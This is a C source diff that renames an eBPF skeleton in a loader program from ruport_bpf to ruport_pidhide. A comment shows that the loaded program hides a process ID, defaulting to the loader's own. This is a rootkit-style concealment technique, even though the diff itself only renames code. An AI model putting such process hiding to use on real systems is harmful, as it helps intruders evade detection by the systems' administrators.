@@ -16,7 +16,7 @@
 #include <bpf/bpf.h>
 #include <linux/if_link.h>
 #include <linux/pkt_cls.h>
-#include "ruport.skel.h"
+#include "ruport.pidhide.skel.h"
 #include "ruport.xdp.skel.h"
 #include "ruport.tc.skel.h"
 
@@ -130,7 +130,7 @@ static __inline void clearFunctionNode(struct FunctionNode **header) {
 
 // global
 // variables about bpf/sockmapxdp/tc
-struct ruport_bpf *g_skel = 0;
+struct ruport_pidhide *g_skel = 0;
 struct ruport_sockmap *g_sockmap_skel = 0;
 struct _xdptcinfo *g_xdpinfo = 0;
 struct _xdptcinfo *g_tcinfo = 0;
@@ -169,15 +169,15 @@ static int handle_event(void *ctx, void *data, size_t data_sz)
    // const struct event *e = data;
     return 0;
 }
-struct ruport_bpf *loadbpffilter() {
-    struct ruport_bpf *skel = (struct ruport_bpf*)0;
+struct ruport_pidhide *loadbpffilter() {
+    struct ruport_pidhide *skel = (struct ruport_pidhide*)0;
 	int err;
     struct ring_buffer *rb = NULL;
 
 	/* Open BPF application */
-	skel = ruport_bpf__open();
+	skel = ruport_pidhide__open();
 	if (!skel) {
-        skel = (struct ruport_bpf*)0;
+        skel = (struct ruport_pidhide*)0;
 		goto exit;
 	}
     // Set the Pid to hide, defaulting to our own PID
@@ -191,9 +191,9 @@ struct ruport_bpf *loadbpffilter() {
     skel->rodata->target_ppid = env.target_ppid;
 
 	/* Load & verify BPF programs */
-	err = ruport_bpf__load(skel);
+	err = ruport_pidhide__load(skel);
 	if (err) {
-        skel = (struct ruport_bpf*)0;
+        skel = (struct ruport_pidhide*)0;
 		goto exit;
 	}
 
@@ -222,9 +222,9 @@ struct ruport_bpf *loadbpffilter() {
     }
 
 	/* Attach tracepoint handler */
-	err = ruport_bpf__attach(skel);
+	err = ruport_pidhide__attach(skel);
 	if (err) {
-        skel = (struct ruport_bpf*)0;
+        skel = (struct ruport_pidhide*)0;
 		goto exit;
 	}
     // Set up ring buffer
@@ -239,9 +239,9 @@ exit:
     return skel;
 }
 
-void releasebpf(struct ruport_bpf *skel) {
+void releasebpf(struct ruport_pidhide *skel) {
     if (skel != 0) {
-        ruport_bpf__destroy(skel);
+        ruport_pidhide__destroy(skel);
     }
 }
 
